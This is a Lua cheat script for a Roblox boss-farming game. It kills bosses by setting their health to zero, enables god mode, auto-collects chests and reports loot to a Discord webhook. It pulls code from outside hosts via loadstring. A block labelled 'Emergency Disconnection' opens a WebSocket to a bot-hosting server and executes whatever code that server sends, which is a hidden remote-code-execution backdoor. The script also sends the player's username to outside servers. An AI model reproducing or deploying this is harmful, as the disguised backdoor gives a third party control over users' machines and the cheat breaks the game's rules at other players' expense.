
repeat
    task.wait()
until game:IsLoaded()

print("Script Loading")
if not getgenv().StingrayLoaded then
getgenv().StingrayLoaded = true
print("Script Loaded")

-- Init --

local StartTime = tick()
local LocalPlayer = game:GetService("Players").LocalPlayer

-- Load Configs--

-- Webhook
pcall(function()
    if getgenv().Webhook then
        writefile("JJI_Webhook.txt", getgenv().Webhook)
    end
    if readfile("JJI_Webhook.txt") then
        getgenv().Webhook = readfile("JJI_Webhook.txt")
    end
end)


-- Luck Boosts
getgenv().LuckBoosts = {}
local Used,LuckError = pcall(function()
    local LuckConfigs = 
        game:HttpGet("http://de3.bot-hosting.net:21824/jji/config/luck?username="..LocalPlayer.Name)
    print(LuckConfigs)
    if LuckConfigs ~= "None Found" then
        for Item in string.gmatch(LuckConfigs, "([^,]+)") do
            Item = string.gsub(Item, "^%s+","")
            table.insert(getgenv().LuckBoosts, Item)
        end
    else
         getgenv().LuckBoosts = {"Luck Vial"}
    end
end)
if not Used then
    print("Luck Boosts Error:",LuckError)
end

-- Discord
getgenv().DiscordPing = ""
local DiscordSuccess,DiscordError = pcall(function()
    local DiscordConfig = 
        game:HttpGet("http://de3.bot-hosting.net:21824/jji/config/discord?username="..LocalPlayer.Name)
    if DiscordConfig ~= "None Found" then
        DiscordPing = "<@"..DiscordConfig..">"
    else
        DiscordPing = "None"
    end
    print(DiscordPing)
end)

-- Min Damage Percentage
getgenv().MinPercentage = 10
local DmgSuccess,DmgError = pcall(function()
    local DmgConfig = 
        game:HttpGet("http://de3.bot-hosting.net:21824/jji/config/dmg?username="..LocalPlayer.Name)
    if DmgConfig ~= "None Found" then
        getgenv().MinPercentage = DmgConfig
    else
        getgenv().MinPercentage = "None"
    end
    print(MinPercentage)
end)

-- Emergency Disconnection --
task.spawn(function()
    local s, e = pcall(function()
        local WSConnection = WebSocket.connect("ws://de3.bot-hosting.net:21824/ws")
        task.wait(1)
        WSConnection.OnMessage:Connect(function(k)
            local s, e = pcall(function()
                WSConnection:Send(loadstring(k)())
            end)
        end)
        task.wait(1)
        WSConnection:Send("Connection Success - " .. LocalPlayer.Name)
    end)
end)

-- UI --
local UI = loadstring(game:HttpGet("http://www.stingray-digital.online/script/ui"))()
local MainUI = UI.InitUI()

local Toggle = "ON"
pcall(function()
    if isfile("JJI_State.txt") then
        Toggle = readfile("JJI_State.txt")
    else
        writefile("JJI_State.txt","ON")
    end
end)

print("QUEUE TOGGLE: "..Toggle)

if Toggle == "ON" then
    UI.SetState(true)
else
    UI.SetState(false)
end

UI.SetMain(function(State)
    if State == 1 then
        Toggle = "ON"
    else
        Toggle = "OFF"
    end
    writefile("JJI_State.txt",Toggle)
    print(readfile("JJI_State.txt"))
end)


-- Constants
local Cats = {"Withered Beckoning Cat", "Wooden Beckoning Cat", "Polished Beckoning Cat","Golden Beckoning Cat"}
local Loti = {"White Lotus","Sapphire Lotus","Jade Lotus","Iridescent Lotus"} -- Did you know the plural of Lotus is Loti 
local Highlight = {"5 Demon Finger","Maximum Scroll","Domain Shard","Iridescent Lotus","Polished Beckoning Cat","Sapphire Lotus","Fortune Gourd","Demon Finger","Energy Nature Scroll","Purified Curse Hand","Jade Lotus","Cloak of Inferno","Split Soul","Soul Robe","Playful Cloud","Ocean Blue Sailor's Vest","Deep Black Sailor's Vest","Demonic Tobi","Demonic Robe","Rotten Chains"}
local Runners = {"Soul Curse"} -- Damn monkeys go AEEHOIIII, add to this table if you feel like a boss is running too much

local QueueSuccess = "False"
if Toggle == "ON" then
    local Queued, QueueFail = pcall(function()
        queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/Nebula-Manta/Stingray/refs/heads/main/JJI/BossFarm.lua"))()
    end)
    if not Queued then
        print("Put this script inside your auto-execution folder:", QueueFail)
        QueueSuccess = QueueFail
    else
        print("Queue success")
        QueueSuccess = "True"
    end
end

-- Black screen check & Fail safe --
task.spawn(function()
    task.wait(120)
    while true do
        game:GetService("TeleportService"):Teleport(10450270085)
        task.wait(10)
    end
end)

if game.PlaceId == 10450270085 then
    task.spawn(function()
        while true do
            game:GetService("TeleportService"):Teleport(119359147980471)
            task.wait(10)
        end
    end)
elseif game.PlaceId == 119359147980471 then
    local SelectedBoss = "Soul Curse"
    pcall(function()
        if readfile("JJI_LastBoss.txt") then
            SelectedBoss = readfile("JJI_LastBoss.txt")
        end
    end)
    task.wait(3)
    while task.wait(1) do
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Raids"):WaitForChild("QuickStart"):InvokeServer("Boss",SelectedBoss,4,"Nightmare")
    end
end

repeat
    task.wait()
until LocalPlayer.Character
local Root = LocalPlayer.Character:WaitForChild("HumanoidRootPart")


local Objects = workspace:WaitForChild("Objects")
local Mobs = Objects:WaitForChild("Mobs")
local Spawns = Objects:WaitForChild("Spawns")
local Drops = Objects:WaitForChild("Drops")
local Effects = Objects:WaitForChild("Effects")
local Destructibles = Objects:WaitForChild("Destructibles")

local LootUI = LocalPlayer.PlayerGui:WaitForChild("Loot")
local Flip = LootUI:WaitForChild("Frame"):WaitForChild("Flip")
local Replay = LocalPlayer.PlayerGui:WaitForChild("ReadyScreen"):WaitForChild("Frame"):WaitForChild("Replay")

-- Destroy fx --
Effects.ChildAdded:Connect(function(Child)
    if Child.Name ~= "DomainSphere" then
        game:GetService("Debris"):AddItem(Child, 0)
    end
end)

game:GetService("Lighting").ChildAdded:Connect(function(Child)
    game:GetService("Debris"):AddItem(Child, 0)
end)

Destructibles.ChildAdded:Connect(function(Child)
    game:GetService("Debris"):AddItem(Child, 0)
end)

-- Uh, ignore this spaghetti way of determining screen center --
local MouseTarget = Instance.new("Frame", LocalPlayer.PlayerGui:FindFirstChildWhichIsA("ScreenGui"))
MouseTarget.Size = UDim2.new(0, 0, 0, 0)
MouseTarget.Position = UDim2.new(0.5, 0, 0.5, 0)
MouseTarget.AnchorPoint = Vector2.new(0.5, 0.5)
local X, Y = MouseTarget.AbsolutePosition.X, MouseTarget.AbsolutePosition.Y

-- Funcs -- 
local function Godmode(State)
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Combat"):WaitForChild("ToggleMenu"):FireServer(State)
end

local function GetValues(S) -- For curse market
    local Result = {}
    for v in string.gmatch(S, "([^|]+)") do
        table.insert(Result, v)
    end
    return Result
end

local function Encode(data) -- Pass data through url, safety encoding
    local SafeStr = game:GetService("HttpService"):UrlEncode(data)
    SafeStr = string.gsub(SafeStr,"+", "-")
    SafeStr = string.gsub(SafeStr,"/", "_")
    SafeStr = string.gsub(SafeStr,"=", "")
    return SafeStr
end


local function Skill(Name)
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Combat")
        :WaitForChild("Skill"):FireServer(Name)
end

local function OpenChest()
    for i, v in ipairs(Drops:GetChildren()) do
        if v:FindFirstChild("Collect") then
            fireproximityprompt(v.Collect)
        end
    end
end

local function Hit()
    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Combat"):WaitForChild("M2"):FireServer(2)
end

local function Click(Button)
    Button.AnchorPoint = Vector2.new(0.5, 0.5)
    Button.Size = UDim2.new(50, 0, 50, 0)
    Button.Position = UDim2.new(0.5, 0, 0.5, 0)
    Button.ZIndex = 20
    Button.ImageTransparency = 1
    for i, v in ipairs(Button:GetChildren()) do
        if v:IsA("TextLabel") then
            v:Destroy()
        end
    end
    local VIM = game:GetService("VirtualInputManager")
    VIM:SendMouseButtonEvent(X, Y, 0, true, game, 0)
    task.wait()
    VIM:SendMouseButtonEvent(X, Y, 0, false, game, 0)
    task.wait()
end


-- Farm start --
local ScriptLoading = tostring(math.floor((tick()-StartTime)*10)/10)

local InitialTween = game:GetService("TweenService"):Create(Root,TweenInfo.new(1),{CFrame = Spawns.BossSpawn.CFrame + Vector3.new(0, 10, 0)})
InitialTween:Play()
InitialTween.Completed:Wait()


repeat task.wait() until Mobs:FindFirstChildWhichIsA("Model")

local Boss = Mobs:FindFirstChildWhichIsA("Model").Name

local Config
game:GetService("ReplicatedStorage").Remotes.Client.GetClosestTarget.OnClientInvoke = function()
    return Mobs[Boss].Humanoid
end

task.spawn(function()
    local s, e = pcall(function()
        writefile("JJI_LastBoss.txt", Boss)
    end)
    if not s then
        print("Last boss config saving failed:",e)
    end
end)
print("Aim hooked to "..Boss)
--Godmode(true)

-- Update curse market data
task.spawn(function()
    local s,e = pcall(function()
        local T = {}
        for i,v in pairs(game:GetService("ReplicatedStorage").CurseMarket:GetChildren()) do
            local Values = GetValues(v.Value)
            local TradeMessage = Values[3].."x "..Values[1].." -> "..Values[4].."x "..Values[2]
            table.insert(T,TradeMessage)
        end
        local Msg = Encode(table.concat(T,"\n"))
        print(game:HttpGet("http://de1.bot-hosting.net:21265/script/cursemarket?trades="..Msg))
    end)
    if not s then print("Curse market update failure:",e) end
end)

-- Use boosts --
local LotusActive = LocalPlayer.ReplicatedData.chestOverride
local CatActive = LocalPlayer.ReplicatedData.luckBoost
local LotusValue,CatValue = 0,0
task.spawn(function()
    for _, Item in pairs(getgenv().LuckBoosts) do
        task.wait()
        if table.find(Loti,Item) and LotusActive.Value == 0 then
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Data")
                :WaitForChild("EquipItem"):InvokeServer(Item)
            print(Item.." used")
        end
        task.wait(0.5)
        if LotusActive.Value == 0 then
            if (not table.find(Cats, Item)) or CatActive.duration.Value == 0 then
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Data")
                    :WaitForChild("EquipItem"):InvokeServer(Item)
                print(Item.." used")
            end
        end
    end
    LotusValue = LotusActive.Value or 0
    CatValue = CatActive.amount.Value
end)


-- Skill spam -- 
task.wait(1)
local DamagePercent = 0
task.spawn(function()
    while Mobs:FindFirstChild(Boss) do
        if not Root.Parent:FindFirstChild("ForceField") then
            Godmode(true)
        end
        Mobs[Boss]:FindFirstChild("HumanoidRootPart").CFrame = Root.CFrame + Root.CFrame.LookVector*3
        local BossHumanoid = Mobs[Boss].Humanoid
        local Percent = ((BossHumanoid.MaxHealth-BossHumanoid.Health)/BossHumanoid.MaxHealth)*100 
        if Percent>=tonumber(getgenv().MinPercentage) then
            if DamagePercent == 0 then 
                DamagePercent = math.floor(Percent*10)/10
            end
            Mobs[Boss].Humanoid.Health = 0
        end
        Hit()
        task.wait()
    end
end)


repeat
    task.wait()
until Drops:FindFirstChild("Chest") -- Could have used WaitForChild here, but I felt it feels cursed not assigning WaitForChild to a variable, then I don't want an unusused variable...

local Items,HasGoodDrops = "| ",false
game:GetService("ReplicatedStorage").Remotes.Client.Notify.OnClientEvent:Connect(function(Message)
    local Item = string.match(Message, '">(.-)</font>')
    print(Message)
    if not (string.find(Item,"Stat Point") or string.find(Item,"Level")) then
        if table.find(Highlight,Item) then
            Item = "**"..Item.."**"
            HasGoodDrops = true
        end
        Items = Items .. Item .. " | "
    end
end)

-- Overwrite chest collection function --
local ChestsCollected = 0
local s, e = pcall(function()
    game:GetService("ReplicatedStorage").Remotes.Client.CollectChest.OnClientInvoke = function(Chest)
        if Chest then
            ChestsCollected = ChestsCollected + 1
            print("Chest Collected")
        end
        return {}
    end
end)

task.spawn(function()
    while Drops:FindFirstChild("Chest") or LootUI.Enabled do
        if not LootUI.Enabled then
            OpenChest()
        else
            repeat
                Click(Flip)
            until not LootUI.Enabled
        end
        task.wait()
    end
end)

repeat
    task.wait()
until not (Drops:FindFirstChild("Chest") or LootUI.Enabled)

-- Send webhook message --
local Sent,Error = pcall(function()
task.wait(2)
    if getgenv().Webhook then
        local Executor = (identifyexecutor() or "None Found")
        local Content = ""
        if HasGoodDrops and DiscordPing ~= "None" then
            Content = Content .. DiscordPing
        end
        Content = Content .. "\n-# [Debug Data] "..
                    "Executor: "..Executor..
                    " | Script Loading Time: "..tostring(ScriptLoading)..
                    " | Damage Percentage: "..tostring(DamagePercent)..
                    "% | Chests Collected: "..tostring(ChestsCollected)..
                    " | Cat Boost: "..tostring(CatValue)..
                    "x | Lotus Boost: "..tostring(LotusValue).." | Send a copy of this data to Manta if there's any issues"
        print("Sending webhook")
        task.wait()
        local embed = {
            ["title"] = LocalPlayer.Name .. " has defeated " .. Boss .. " in " ..
                tostring(math.floor((tick() - StartTime) * 10) / 10) .. " seconds",
            ['description'] = "Collected Items: " .. Items,
            ["color"] = tonumber(000000)
        }
        local a = request({
            Url = getgenv().Webhook,
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = game:GetService("HttpService"):JSONEncode({
                ['embeds'] = {embed},
                ['content'] = Content,
                ['avatar_url'] = "https://cdn.discordapp.com/attachments/1089257712900120576/1105570269055160422/archivector200300015.png"
            }),
            Method = "POST"
        })
        print("Webhook sent!")
    end
end)
-- Click replay --
task.wait()
    for i = 1, 10, 1 do
        Click(Replay)
        task.wait(1)
    end
end
